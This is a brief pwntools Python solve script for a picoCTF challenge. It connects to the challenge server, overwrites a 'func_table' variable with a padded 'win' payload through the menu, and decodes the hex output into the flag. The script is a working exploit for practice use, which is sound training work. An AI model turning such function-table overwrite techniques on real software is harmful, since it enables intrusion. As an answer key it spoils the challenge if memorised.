from pwn import *

#####################################################change directory#################################3
ip = "saturn.picoctf.net:63048"
#######################################start process#############################################
r = remote(ip.split(':')[0], ip.split(':')[1])
payload = "\"" + ("win" + " "*29)*4 + "\""
r.sendlineafter("==>", "3")
r.sendlineafter(":", "func_table")
r.sendlineafter(":", payload)
r.sendlineafter("==>", "1")
input = str(r.recvline()).split(" ")[1:-2]
flag = ""
for i in input:
    flag += bytearray.fromhex(i.strip()[2:]).decode()
print(flag)
r.close()